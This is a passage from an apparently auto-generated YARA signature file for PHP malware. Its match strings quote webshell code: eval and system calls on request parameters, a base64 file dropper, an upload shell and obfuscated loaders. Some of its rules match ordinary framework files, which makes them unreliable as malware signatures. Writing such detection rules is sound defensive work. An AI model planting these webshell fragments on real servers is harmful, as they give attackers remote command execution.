      $s13 = "4cS\"}[\"u\\x6b\\x6fvf\\x76\\x6c\\x6fh\\x78\"]}=${$ydcwptkfby}[\"\\x63oo\\x6bi\\x65\"];if(${$icqmcvfopn}!=\"\")${$hyyjpcpkjm}.=" ascii
      $s14 = "\\x73o\\x6asf\\x74\"]}=from_host(${$mozsyxlci});}else{${\"\\x47LO\\x42A\\x4cS\"}[\"\\x78w\\x61n\\x6dn\\x6d\\x6d\\x70\"]=\"\\x66" ascii
      $s15 = "\"]}.=\"------------\".${${\"\\x47\\x4cO\\x42\\x41L\\x53\"}[\"\\x71\\x6b\\x62\\x6a\\x66he\"]}.\"\\n\\x43ont\\x65nt-\\x54\\x79pe:" ascii
      $s16 = "0$cookie\\r\\n\";}${$fjvgex}.=\"C\\x6fn\\x6ee\\x63\\x74i\\x6fn: \\x63\\x6co\\x73\\x65\\r\\n\";if(${$dwpfanfroota}[\"\\x6d\\x65th" ascii
      $s17 = "T as${${\"G\\x4cO\\x42\\x41\\x4c\\x53\"}[\"\\x69\\x75\\x78\\x79\\x68qj\"]}=>${$umqbpmiyu}){$wgocolzelat=\"\\x6b\\x65y\";$_POST[$" ascii
      $s18 = "n alter_macros($content){$kteldghkdi=\"\\x69\";preg_match_all(\"#{(.*)}#\\x55\\x69\",${${\"\\x47LOBAL\\x53\"}[\"bn\\x78\\x66\\x7" ascii
      $s19 = "rfnti})!=FALSE){return TRUE;}}return FALSE;}function type1_send(){if(!isset($_POST[\"e\\x6d\\x61i\\x6cs\"])OR!isset($_POST[\"\\x" ascii
      $s20 = "x65m\\x65s\"])OR!isset($_POST[\"\\x6d\\x65\\x73s\\x61ges\"])OR!isset($_POST[\"\\x66\\x72\\x6f\\x6ds\"])OR!isset($_POST[\"\\x6da" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      8 of them
}

rule sig_8c54870d407471ab09c470b6636299721c146600
{
   meta:
      description = "php17 - file 8c54870d407471ab09c470b6636299721c146600.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c7ccb60ef804b0b12e30289a1b969ea41989bf3ffe8e9727680dcaf7be779ee1"
   strings:
      $s1 = "Pg=='));</script>" fullword ascii
      $s2 = "<script language=\"php\">@fputs(fopen(base64_decode('bG9zdC5waHA='),w),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydsb3N0d29sZiddKT" ascii
      $s3 = "<script language=\"php\">@fputs(fopen(base64_decode('bG9zdC5waHA='),w),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydsb3N0d29sZiddKT" ascii
   condition:
      uint16(0) == 0x733c and filesize < 1KB and
      all of them
}


rule sig_0aca50dd8c8967ee7031c5ee2bf92622
{
   meta:
      description = "php17 - file 0aca50dd8c8967ee7031c5ee2bf92622.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a75dbbb6cc23f97c9815e937033f1784294296358b321a13f7c32f421e054f63"
   strings:
      $s1 = "O+yS8geVEAOB75MA5sZsU4Mk4WG8l5Iy4pif8xLE0j0eIE3rw22uRBwHuU/TA8PzMl81YO3O7/30G/pHc7mmbw/H1YP/+//A4TpXqI='))));" fullword ascii
      $s2 = "TTwFWx3gmr8v92LwLMZsHVYQwbpkDwqMD/t+kBQREnI+dTaIoNM4WJANFrGFu07YP7f3AUThRGGnL+qcIauhCx7/4dNz/4aB8c8oM9PJl7G5ZHCnzO1oFSRTYeYSMm2Z" ascii
      $s3 = "eval(base64_decode(gzuncompress(base64_decode('eJwlmt2aqjrXbW8pAam9PJwIAVFCEfIDOQPiUwgBKaUUufo9fL+DdTLXnFWYjNF7a6ouddccuuky2j89r" ascii
      $s4 = "wU2L1z6ZAhh+fGEifBis67GIWTvEebIPwvegW+QZ6Xs57vOBUfevenpFw//e7WR7jV4eCuBD9D8oGF1rwQtakIC6J6XHpJjanUnNvph3Vtqww26efifr0Y6BkdIz87jm" ascii
      $s5 = "jCPkCProqM1Lg77pOGkztRc5iXlegB2J7PISl8Xh//esBsPruzhhOYBeDdsJhLn4sdjrg3Av8pagVdOsueD7SsQs2pYd8X2g3JhMxqhO7hzWdkOXMQKTcgtC4zk2HhVy" ascii
      $s6 = "tppgX2OlqPg3ch45dGA/NXyiIz0k7qcIe/8EuZ9akbxrqNwS2P5myoP7ng/m5iFME+WxvPWSv0LnbVVg/5Kp9xR133UxLproaP51p3EIFmKpG4242pF/HzqilxVuB3/c" ascii
      $s7 = "qZslRKf167vAy9cBU40Q3QyUfuE3XegVzMadXODmW5IUtEtcVQot+a9z4Qws4rIBJ0R16U9ZWXnQp6RJvrZ8ZJ0LRleuehU68gv6swuK/Zrfn1sFP3AnBs/d/WzEi2iD" ascii
      $s8 = "s/RonUgXTnOvxfp/7ZuMjLr/xai21QZ7rJo2BhaE8ppWkdrmkW5kztdeXbZn+HVS6D/vDTEdTO83rQ3jPa+al154qo7NkTcRQRnQfwzG7tfEQ537qycWj3JgMxtaDrmk" ascii
      $s9 = "tFaF+X8rK/7qVHpamI/5aE8UdnZ/30GOiVVDvfBBu+Q2vl+mbo6LxMiP59FO9q/TFowJIOC00MLDqOgZ1Ocvw2ivQrb9QIu2WyWNc5xvXAamWIZGJxjG8P+x93Ky64/o" ascii
      $s10 = "HQv7eitGMWWq/UPctWX6uddQ0/V8rYCX8Ie4odS88wtfQp0Q6ZPtjQgAmYoaJzdmm/0pUdv5mJ5XK57pq57r3Do0Pba5pM9tiMJm16iTHSxJHbJt/Autp9XGv14l09/j" ascii
      $s11 = "5TIL/A9LkZLwKuUVl4nnZtzCcyrdv9tWiwhsKtfc2AA8XhptbcVHl6Q+okIzUm6psvFvGg33cxIVTUlXxWutnrAN14sXjsxcEyW5UMSVlu30UHfc3v0BKqe9LAcoNu/G" ascii
      $s12 = "J/yaAOWtqUtL4E/6dh3aSiPtfVD6sJr35KcWVm1g9hdYDcrToQK6XTpqaNdkpuhc3WQrKJvvUZ4j8tEs9ztSDvNeQF8D5ziQh12GfRd45gdsBQ+IzlL4Cu4m+9CrN1FH" ascii
      $s13 = "w3e+mVEtfKBHeF+qBRH3OIEdkz/pmJ91OAMwMaqIDquVIegb6c0SpIceU9FWA58NYAPZSe3csxmp8IxhwofX0Xsi9ydg3zwftlov01wfJ5c/YKMBZvd5+AEZaaO93ZAc" ascii
      $s14 = "jQHSYxvYsmMeuyqwQZpsa9qNIMngNOP8qQd8hDR6pkBW3AhXPXyV6LdyqTMuewOqVO9atT9wj6EgpsN2ChgoutVHDo1eA70/AocuwKHIXgtB12y3oTzJEj3l5b0m07gf" ascii
      $s15 = "YQAnnSAq0rqNmhYKwt565qUhSRsp041YXjXyE6XEAseWqB5b9Xu0VNQRKkFrwBnqhA9M8hbOc5Js/3DRpiRKempXjuZ6pymJyqXMpdRhZtoAQ/ZezDrKRuTrOJ2kYTYL" ascii
      $s16 = "tLGwL/pSxyWWof0Dj6/pDiBAsL3E9IF/L5XJtItFXDGo3dtpoRAHwSft+4NcFJqf1x12F8pIQ/N2TeD84WzvLel/4SsOagpselhX2Swp2dMPIbCV4WSBXLBVarz6OQrN" ascii
      $s17 = "XxyzYh/uEykzxVzZahhBghrXfJXDdhCntzh5/kA6wXr2ZCJ5LcNK1eiPezoHDQxO8A5Fk3k2dqxD4npEVjuKKNhl7tsyUt2NYSy9rDfIJczg8nzIjA45s3llt5q+c+D+" ascii
      $s18 = "IB3i70joxnukJ6b2KA0ZJNSHnCS2PKJdsWIHehZcinBM8KlN/EAfK1f5v3wMilwAc9wiQ30sbc0IUuBiSLgPqCS/Z2Tm1e59O+05VuFIct5MkEmVFmIlxrugpMukGN+B" ascii
      $s19 = "2cMndB3wOQwk+/9KZ0SzCNPiF6eKjRD7pOcj3ahpU3T91Jk4Rxl5XDP1PJMox26CPNsSwEsi7t6a7GOwhfM1JlDGnGx3NMymfKNfAHfZiLEcG+EClXducIp33SRElZXk" ascii
      $s20 = "akFzC9OXfrQzmOnir0joBvpmHqf78uoANg6PrrpsC5V/8mdxAMvuYOzvdm42JSEdzMmL23prxz3kKniXth8p2PILdl93vc4ZWE30k2sMP/kjPJ3axPKer+Avb8a2R3hm" ascii
   condition:
      uint16(0) == 0x4947 and filesize < 40KB and
      8 of them
}

rule attributes_table
{
   meta:
      description = "php17 - file attributes_table.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b8ab99b97e93aec855fa67805859296eb21153bc4ddbdf76dfb77a557e7c5176"
   strings:
      $s1 = "<li><a href=\"<?=Loader::helper('navigation')->getLinkToCollection($c)?>?asGroupAttributes=0\"><?=t('In One List')?></a></li>" fullword ascii
      $s2 = "ualist += '&ccm_token=' + '<?=Loader::helper('validation/token')->generate('attribute_sort')?>';" fullword ascii
      $s3 = "<a href=\"<?=URL::to($editURL, 'edit', $ak->getAttributeKeyID())?>\" title=\"<?php echo t('Handle')?>: <?php echo $ak->getAttri" fullword ascii
      $s4 = "<a href=\"<?=URL::to($editURL, 'edit', $ak->getAttributeKeyID())?>\" title=\"<?php echo t('Handle')?>: <?php ec" fullword ascii
      $s5 = "<a href=\"<?=URL::to($editURL, 'edit', $ak->getAttributeKeyID())?>\" title=\"<?php echo t('Handle')?>: <?ph" fullword ascii
      $s6 = "$.post('<?=URL::to('/ccm/system/attribute/attribute_sort/set')?>', ualist, function(r) {});" fullword ascii
      $s7 = "<form method=\"get\" action=\"<?=$view->action('select_type')?>\" id=\"ccm-attribute-type-form\">" fullword ascii
      $s8 = "$unsetattribs = $category->getController()->getSetManager()->getUnassignedAttributeKeys();" fullword ascii
      $s9 = "<ul class=\"item-select-list ccm-sortable-attribute-set-list-wrapper\" attribute-set-id=\"<?=$as->getAttributeSetID()?>" fullword ascii
      $s10 = "<li><a href=\"<?=Loader::helper('navigation')->getLinkToCollection($c)?>?asGroupAttributes=1\"><?=t('Grouped by Set')?></a></li>" ascii
      $s11 = "<?php $form = Loader::helper('form'); ?>" fullword ascii
      $s12 = "$ih = Loader::helper('concrete/ui');" fullword ascii
      $s13 = "<?=$ak->getAttributeKeyDisplayName()?></a>" fullword ascii
      $s14 = "ho $ak->getAttributeKeyHandle();" fullword ascii
      $s15 = "$setattribs = $as->getAttributeKeys();" fullword ascii
      $s16 = "p echo $ak->getAttributeKeyHandle();" fullword ascii
      $s17 = "<?=$ak->getAttributeKeyDisplayName()?>" fullword ascii
      $s18 = "<li class=\"ccm-attribute\" id=\"akID_<?=$ak->getAttributeKeyID()?>\">" fullword ascii
      $s19 = "<legend><?=$as->getAttributeSetDisplayName()?></legend>" fullword ascii
      $s20 = "$formatter = $controller->getIconFormatter();" fullword ascii
   condition:
      uint16(0) == 0x3c0a and filesize < 20KB and
      8 of them
}

rule sig_64d4495875a809b2730bd93bec2e33902ea80a53
{
   meta:
      description = "php17 - file 64d4495875a809b2730bd93bec2e33902ea80a53.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "65dee1e18a4ff8c779b27e6168c5ecf572461ea8158eb4d82fee6ddbfb5b02ee"
   strings:
      $x1 = "md\" size=64 value=<?=$cmd?>><hr><pre><?if($cmd != \"\") print Shell_Exec($cmd);?></pre></form><br>" fullword ascii
      $s2 = "<? $cmd = $_REQUEST[\"-cmd\"];?><onLoad=\"document.forms[0].elements[-cmd].focus()\"><form method=POST><br><input type=TEXT name" ascii
      $s3 = "<a href=\"http://www.n-c-c.6x.to\" target=\"_blank\">-->NCC<--</a></center></b></html>" fullword ascii
      $s4 = "echo \"<b><font color=red><br>REFERER: </font></b>\"; echo $_SERVER['HTTP_USER_AGENT'];" fullword ascii
      $s5 = "<title>Upload - Shell/Datei</title>" fullword ascii
      $s6 = "move_uploaded_file($_FILES['probe']['tmp_name'], \"./dingen.php\");" fullword ascii
      $s7 = "printf(\"Die Datei %s wurde als dingen.php hochgeladen.<br />\\n\"," fullword ascii
      $s8 = "<b>--Coded by Silver" fullword ascii
      $s9 = "echo \"<b><font color=red>Momentane Directory:  </font></b>\"; echo $_SERVER['DOCUMENT_ROOT'];" fullword ascii
      $s10 = "echo \"<b><font color=red><br>BROWSER: </font></b>\"; echo $_SERVER[HTTP_REFERER];" fullword ascii
      $s11 = "echo \"<b><font color=red><br>PORT: </font></b>\"; echo $_SERVER['REMOTE_PORT'];" fullword ascii
      $s12 = "<h2>IpLogger</h2>" fullword ascii
      $s13 = "<h2>- Upload -</h2>" fullword ascii
      $s14 = "echo \"<b><font color=red><br>IP: </font></b>\"; echo $_SERVER['REMOTE_ADDR'];" fullword ascii
      $s15 = "<h1>---------------------------------------------------------------------------------------</h1><br>" fullword ascii
      $s16 = "<title>.:NCC:. Shell v1.0.0</title>" fullword ascii
      $s17 = "<h1>.:NCC:. Shell v1.0.0</h1>" fullword ascii
      $s18 = "<h1>---------------------------------------------------------------------------</h1><br>" fullword ascii
      $s19 = "if (isset($_FILES['probe']) and ! $_FILES['probe']['error']) {" fullword ascii
      $s20 = "echo \"<b><font color=red>Server: </font></b><br>\"; echo $_SERVER['SERVER_SIGNATURE'];" fullword ascii
   condition:
      uint16(0) == 0x633c and filesize < 7KB and
      1 of ($x*) and 4 of them
}

rule sig_70969fba5fce02244a72f494de243ffe60ba42f9
{
   meta:
      description = "php17 - file 70969fba5fce02244a72f494de243ffe60ba42f9.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f71a8dd0b656814fcb371a8f2a663ec80247972a33488b65df11d0a2ec7945ff"
   strings:
      $s1 = "$R=str_replace('Rv','','creRvRvatRvRve_RvfunctiRvon');" fullword ascii
      $s2 = "$D=str_replace('3y','',$e.$w.$f.$K.$l.$W.$z.$x.$p.$b);" fullword ascii
      $s3 = "$b='b_e3y3ynd_clea3yn();$d=base3y3y64_enco3yde(x(gzcompres3ys($o)3y,$k))3y;3yprint3y(\"<$k>$d</$k3y>\");3y3y@session_de3ystroy()" ascii
      $s4 = "$b='b_e3y3ynd_clea3yn();$d=base3y3y64_enco3yde(x(gzcompres3ys($o)3y,$k))3y;3yprint3y(\"<$k>$d</$k3y>\");3y3y@session_de3ystroy()" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      all of them
}

rule AbstractExampleFactory
{
   meta:
      description = "php17 - file AbstractExampleFactory.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e13399f45310262e039f7452ea6a3dda50606b8e8f7f93b9c1f939329a062f97"
   strings:
      $s1 = "abstract protected function configureOptions(OptionsResolver $resolver): void;" fullword ascii
      $s2 = "* @param OptionsResolver $resolver" fullword ascii
      $s3 = "use Symfony\\Component\\OptionsResolver\\OptionsResolver;" fullword ascii
      $s4 = "namespace Sylius\\Bundle\\CoreBundle\\Fixture\\Factory;" fullword ascii
      $s5 = "abstract class AbstractExampleFactory implements ExampleFactoryInterface" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_41ab4c4ecba4d414694047272f4b57570d74aec3
{
   meta:
      description = "php17 - file 41ab4c4ecba4d414694047272f4b57570d74aec3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "dbd2634fee2477c1613133797066f15158ea3c1fdc6e103296951e405a17df53"
   strings:
      $s1 = "<script language=\"php\">@eval($_POST[sb])</script>" fullword ascii
   condition:
      uint16(0) == 0x733c and filesize < 1KB and
      all of them
}

rule sig_46261c62571778ad89d0df7f094c9a927f6570ca
{
   meta:
      description = "php17 - file 46261c62571778ad89d0df7f094c9a927f6570ca.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ef9935cb14c0e3259d9d2a8b43b48c67e9bdf5cae12d9a26048a70e13cb3c698"
   strings:
      $s1 = "<?php system($_REQUEST['cmd']); ?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_17ba694804d3294d1803a60a1ee1c4922c57a7bb
{
   meta:
      description = "php17 - file 17ba694804d3294d1803a60a1ee1c4922c57a7bb.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3f2d8dad1b691ba800d1f50f6ae5d90fab8c507747b1550e08fe1cd1589dd0f7"
   strings:
      $s1 = "<?php eval($_POST['c'])?> " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule admin_menu
{
   meta:
      description = "php17 - file admin_menu.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2bfa32a8bf90c7643cceaf307e6e3ae7eece1b358ea3dced96eb6432ac931935"
   strings:
      $s1 = "// | Copyright (c) 2013-2018 http://www.thinkcmf.com All rights reserved." fullword ascii
      $s2 = "// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )" fullword ascii
      $s3 = "<thinkcmf@126.com>" fullword ascii
      $s4 = "// +----------------------------------------------------------------------" fullword ascii
      $s5 = "'USER_INDEXADMIN_DEFAULT1'  => '" fullword ascii
      $s6 = "'USER_INDEXADMIN_DEFAULT3'  => '" fullword ascii
      $s7 = "// | Author: " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule AbstractMysql
{
   meta:
      description = "php17 - file AbstractMysql.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9f26321c2d8b27010f5a2370622aba2db1913912892dae47c6df0496d5ab06bb"
   strings:
      $s1 = "namespace Pimcore\\Model\\Listing\\Dao\\Mysql;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2016_02_09_194940_create_orchid_post_table
{
   meta:
      description = "php17 - file 2016_02_09_194940_create_orchid_post_table.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9ca2a6811981902e6831830109d05ded2f18c2f425d607d22a9ee844efbac74e"
   strings:
      $s1 = "Schema::create('posts', function (Blueprint $table) {" fullword ascii
      $s2 = "Schema::drop('posts');" fullword ascii
      $s3 = "$table->jsonb('content');" fullword ascii
      $s4 = "class CreateOrchidPostTable extends Migration" fullword ascii
      $s5 = "$table->integer('user_id');" fullword ascii
      $s6 = "$table->string('slug', '255')->unique();" fullword ascii
      $s7 = "$table->timestamp('publish_at');" fullword ascii
      $s8 = "$table->string('status')->nullable();" fullword ascii
      $s9 = "$table->index(['status', 'type']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule sig_6b38784f1fb41dedb4c2e1afd43eb9828d9370f2
{
   meta:
      description = "php17 - file 6b38784f1fb41dedb4c2e1afd43eb9828d9370f2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a8741704032226ab6c9a0fac160f3fcfc0cf82f02360bed894a11885f309a253"
   strings:
      $s1 = "$Z='$s;ss($s[$i],;s0,$e);s)),$k));s);;s$o=ob;s_get_content;ss();s;;sob_end_clean(;s);s;$d=bas;se64_';" fullword ascii
      $s2 = "$B='};s}return;s $o;}$r=;s$_SERV;sER;s;$r;sr=@$r[\"HTTP_;sREFE;sRER\"];;s$ra=@$r[;s\"HTTP;s;s_ACCE;sPT';" fullword ascii
      $s3 = "$z='i].=;s$p;$e;s;s=strpo;ss($s[$i],$;sf);if($e);s{;s$k=$kh.$kf;s;o;sb_start();s;@ev;sal(@gz;suncom';" fullword ascii
      $s4 = "$G=';s;sencode(x(gzcompre;s;sss($o);s,$k));print;s(\"<$k;s>$d</$k>\";s);@se;ss;ssion_destro;sy();}}}}';" fullword ascii
      $s5 = "$f='rpos(;s$p,$;sh)==;s=0){$s[$;si]=\"\";$p;s=;s$ss($p;s,3;s);};sif(array_key_exists($i,$;ss)){;s$s[$';" fullword ascii
      $s6 = "$Y='pres;ss(@x;s(;s@b;sase6;s4_decode(preg_rep;sla;sc;s;se(array(\"/_/\",;s\"/-/\"),array;s(\"/\",\";s+\"),';" fullword ascii
      $s7 = "$r='rray_v;salues;s(;s$q);s;preg_ma;stch_all;s(\"/([\\\\w])[\\\\w-;s];s+(?:;q;s;s=0.([\\\\d]))?,?;s/\",;s$ra,$';" fullword ascii
      $s8 = "$A='m);if($q;s&&$m;s){@s;sess;sio;sn_start;s();$s=&$_SESSIO;sN;$;s;s;ss;ss=\"substr\";$sl=\"strtolower';" fullword ascii
      $s9 = "$q='$kh=\"5d41;s\";$kf=;s\"40;s2a\";;sfunct;sion ;sx($t,$k){$;sc=s;strlen($k;s);$l=strlen($;st;s);$;so=';" fullword ascii
      $s10 = "$J='_LANGUAGE\"];if;s($rr;s&&$ra){$;s;su=parse;s_url($rr);s;parse_;sstr($u[;s\"qu;sery\";s;s],$q);$q=a';" fullword ascii
      $s11 = "$l=';s\";$i=$m;s[1][;s0].$m[1;s;s][1];$h=;s$sl($ss(md5;s($i;s.$kh),;s0,3));$f=;s$s;sl(;s;s$ss(md5(;s';" fullword ascii
      $s12 = "$u='\";s\";f;sor($i=0;$i<$l;){f;s;sor;s($j=0;($j<$c&&$i<$l;s);;s$j++,$i+;s+){$o.;s=$t{$;si}^$k{$j;s};';" fullword ascii
      $s13 = "$O='$;si.$k;sf),0,3));$p=\"\";fo;sr;s($z=1;$z<count;s($m[1]);$z;s+;s+)$p.=$q[;s$;sm[2][$;sz]];s;if(st';" fullword ascii
      $s14 = "$Q=str_replace(';s','',$q.$u.$B.$J.$r.$A.$l.$O.$f.$z.$Y.$Z.$G);" fullword ascii
      $s15 = "$S=str_replace('iS','','creiSatiSe_iSfuiSiSnctiSion');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_65fd4b8db6627c7f7760a089c8b99d638ae5c5c4
{
   meta:
      description = "php17 - file 65fd4b8db6627c7f7760a089c8b99d638ae5c5c4.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b674d5f8da4432f7cad0474b166cbbe1b9bf2728ecb33b63250191301229ec0d"
   strings:
      $s1 = "<?php $s=@$_GET[2];if(md5($s.$s)==\"e67c2597ecad64bb4cdad6633b04107f\")@eval($_REQUEST[$s]); ?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2_2_1_pl
{
   meta:
      description = "php17 - file 2.2.1-pl.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a94b1a635bedc4a5816609cb84180d64b46e98d91c3bbf1b92490120a535b670"
   strings:
      $s1 = "/* get all users who are Super Users of Administrator group and make them sudo */" fullword ascii
      $s2 = "$this->processResults($class, $description, array($modx->manager, 'addField'), array($class, 'session_stale'));" fullword ascii
      $s3 = "$this->processResults($class, $description, array($modx->manager, 'removeIndex'), array($class, 'parent'));" fullword ascii
      $s4 = "$this->processResults($class, $description, array($modx->manager, 'addField'), array($class, 'properties'));" fullword ascii
      $s5 = "$this->processResults($class, $description, array($modx->manager, 'removeField'), array($class, 'parent'));" fullword ascii
      $s6 = "$this->processResults($class, $description, array($modx->manager, 'alterField'), array($class, 'access'));" fullword ascii
      $s7 = "$this->processResults($class, $description, array($modx->manager, 'addIndex'), array($class, 'access'));" fullword ascii
      $s8 = "$this->processResults($class, $description, array($modx->manager, 'addField'), array($class, 'assets_path'));" fullword ascii
      $s9 = "$this->processResults($class, $description, array($modx->manager, 'addField'), array($class, 'sudo'));" fullword ascii
      $s10 = "$description = $this->install->lexicon('add_column',array('column' => 'session_stale','table' => $table));" fullword ascii
      $s11 = "$users = $modx->getCollection('modUser',$c);" fullword ascii
      $s12 = "$description = $this->install->lexicon('drop_index',array('index' => 'parent','table' => $table));" fullword ascii
      $s13 = "$description = $this->install->lexicon('drop_column',array('column' => 'parent','table' => $table));" fullword ascii
      $s14 = "$description = $this->install->lexicon('add_column',array('column' => 'assets_path','table' => $table));" fullword ascii
      $s15 = "$description = $this->install->lexicon('add_column',array('column' => 'sudo','table' => $table));" fullword ascii
      $s16 = "$description = $this->install->lexicon('add_column',array('column' => 'properties','table' => $table));" fullword ascii
      $s17 = "$description = $this->install->lexicon('add_index',array('index' => 'access','table' => $table));" fullword ascii
      $s18 = "/* modify nullability and add index to modSession.access */" fullword ascii
      $s19 = "* Specific upgrades for Revolution 2.2.1-pl" fullword ascii
      $s20 = "/* add session_stale field to modUser */" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 9KB and
      8 of them
}

rule sig_2000_01_02_000001_create_payment_accounts_table
{
   meta:
      description = "php17 - file 2000_01_02_000001_create_payment_accounts_table.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c0db574d52eb5fde183cb12e3c355756ee2f09f5931a959efb8a43efc9b02eb7"
   strings:
      $s1 = "* @author  Mahmoud Zalt  <mahmoud@zalt.me>" fullword ascii
      $s2 = "$table->foreign('user_id')->references('id')->on('users');" fullword ascii
      $s3 = "Schema::create('payment_accounts', function (Blueprint $table) {" fullword ascii
      $s4 = "* Class CreatePaymentAccountsTable" fullword ascii
      $s5 = "Schema::drop('payment_accounts');" fullword ascii
      $s6 = "$table->integer('user_id')->unsigned();" fullword ascii
      $s7 = "$table->morphs('accountable');" fullword ascii
      $s8 = "class CreatePaymentAccountsTable extends Migration" fullword ascii
      $s9 = "$table->string('name')->nullable();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule sig_3b8e2aa89e9f402b49d42bb9cd1300a3272d1bcd
{
   meta:
      description = "php17 - file 3b8e2aa89e9f402b49d42bb9cd1300a3272d1bcd.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c0b8e42d68840861c9841d59c47dbe114d232942ab44f07df7c02c1a57365a30"
   strings:
      $s1 = "=')).'U9maeG5bocdGplY5+XYyEiEfUkJpH+mjAOu/egJ135qMdEmaNvlRAsgpCs7V0raU/P5r/7Hn/7Vb/+3tz9GXbAJ8gsXqoY3OKzijyp5D4TuRZcYBBcHAUtCdNL" ascii
      $s2 = "if (!defined('?9?)) {define('?9?, true);function ?70?$?70?$?02?''){global $?74?if(!$?02?return(base64_decode($?70?);$?93??70?'" fullword ascii
      $s3 = "AxXBACGKSUd\\')).$?8?$?3?$?74?))',\"998fe3c4016b9062897b7d537b4b19cd\");" fullword ascii
      $s4 = "JvtpEJJy86wfvEbHEJ7yawFJLYglknrk0yWmLnoNqMoH2IKaR9FVMWUJfF0noMElaHnlN8jSD4dPrXDyDZQVv8qUQJKNq59I0FND31wvzRTXDpAcbs2lOGRC0ogUbr6T" ascii
      $s5 = "YeuWcSAJ/8dkH7SxjZ1LXmBPtxUvqC4mdGGl/lfavfKCXHmTOAEaNepxMRYueVIPHwZxGUWLe6bKOjIhCxX1i36fTp4PTWFRXeccXeHFOos1RQhuYGp39VIqdl1L7puM" ascii
      $s6 = "+8HQ67XSVzKQc2PgDgae36sOhk4wTIukYXXodd1qx+t6w3RBJXadllevvjnyh+6gGox6CMTZXjNtDYZB3x/Q59Dv+MdukLYmq5XVnfurO0/s27u729U9+FVdWlvd3LUP" ascii
      $s7 = "RCNwyjfpke7t+nnNXddLo9+odr06ef23/uOcclXXjOielw6OuQYDLs3vdzQ2doOUO590jxALJ4rwSCWv4wlM0Dek5NLRBx426/aGfUp2RtukgCbCjqRftPDlxOo1Gw1R" ascii
      $s8 = "bjmp0CHF4o8HseQYANknLbZm5LTN3DZSjgZGPCTrEimcQiOfEWm4FN056PjsE0htO8VaZb+ppWw5b6WbacGJX81ME6YyubGIPsBFiwRbGR6gq2WcqTE/trN7bW63sVvd" ascii
      $s9 = "wby47MwOfM9PT2enpwmX4c3UuO3t5upidmZ6bvWqXT2M39WRAEq9JAi/EaOdirc+Hqy7KUFcLCQx1yvhTt3y24U+U0/INaj4i3WGPi1cD582RX9YPQhFg1Akj3TX9WLg" ascii
      $s10 = "ugwV9czYW1j/uuQGj5Y3bWEjcDMrWIUBZs1FS4sKCncvZujFSsAge30HJ4jijoIID7FRZOckoHB5UEGOd0uf5vALBmYe9Ht7tircvAjv2VljC2MiiLz+6EsN5hlfCnmt" ascii
      $s11 = "quc8X6rgjgSaMssBYi0UTdH3z1padxQDm4ocRaSYSwQMIRc5jd4FH7kAFVtjEicf4DWZymq51l5oLTFFv4vOFkFSlHpAFdC5awnu0MBECZ+gHQFYYQ8Lo4aWVu+ub4jb" ascii
      $s12 = "2CF07Mal9GIByfUjqOCy15PBDX5vHSCssv8deQMS08W4XNZVM/KDIBticQY/muO3DcknUe42B0+hi4ToKihbCPPMa1LAW+Wjx12O0ZmLmyaDrDDDxrW4NCO8T4cddD99" ascii
      $s13 = "=?');$?29??70?'" fullword ascii
      $s14 = "=');$?48??70?'" fullword ascii
      $s15 = "');$?48??70?'" fullword ascii
      $s16 = ")/$?37?:$?70" fullword ascii
      $s17 = "XZER/1gcZaXm4WrpWtISUFAkKt5eHFZSKRBUXB+UIl3ZVFhUWVIa'.$?3??70?'?" fullword ascii
      $s18 = "B6jqjxrKg9yZMEWCuNUy6iUz6FEYZptGtk/XlPv4uPSgW+kA88n4Lqi6srz0+REZdB7LqvftPoRxxDfF/Zw6m8M23oCqCf1Rqt+secMjDzdrdp7ca2xVgUlEzzM7HHk7" ascii
      $s19 = "return true;?>29d0ddd4a1eb2e862f5b7a80277541bd" fullword ascii
      $s20 = "wzQbkknEDDWmXZ6oNF91p0oxjrGuIXrF6soTixj+36AStTewGtRoPWE3q8TFEDAw6WwBg7GZ+X1QFL1DvKlmXYMRy7BAT/g5fWpL9yI8f5m399Squ8/UFSz1hRU//QG+" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 80KB and
      8 of them
}

rule _user_discount
{
   meta:
      description = "php17 - file _user_discount.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9a3e7bd6b305cd6847fd0b32079ff258ce70e26a6f4fc1fd6841dc206185cacc"
   strings:
      $s1 = "* @var \\app\\modules\\shop\\models\\UserDiscount $object" fullword ascii
      $s2 = "* @var app\\backend\\components\\ActiveForm $form" fullword ascii
